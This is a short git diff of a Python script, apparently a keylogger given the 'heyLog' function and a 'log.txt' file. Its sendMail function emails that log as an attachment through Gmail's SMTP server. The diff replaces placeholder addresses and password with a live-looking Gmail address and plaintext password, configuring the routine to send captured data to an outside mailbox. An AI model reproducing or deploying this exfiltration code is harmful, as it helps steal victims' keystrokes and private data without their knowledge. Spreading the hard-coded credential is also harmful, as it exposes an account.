@@ -37,8 +37,8 @@ def heyLog():
 
 
 def sendMail():
-    fromaddr = "hello@mail.com" #change your mail address
-    toaddr = "hello@mail.com" #change your mail address
+    fromaddr = "trhacknon@gmail.com" #change your mail address
+    toaddr = "trhacknon@gmail.com" #change your mail address
     msg = MIMEMultipart()
     filename = "log.txt"
     attachment = open(filename, "rb")
@@ -49,7 +49,7 @@ def sendMail():
     msg.attach(p)
     s = smtplib.SMTP('smtp.gmail.com', 587)
     s.starttls()
-    s.login(fromaddr, "password") #change your password
+    s.login(fromaddr, "trhacknon") #change your password
     text = msg.as_string()
     s.sendmail(fromaddr, toaddr, text)
     s.quit()
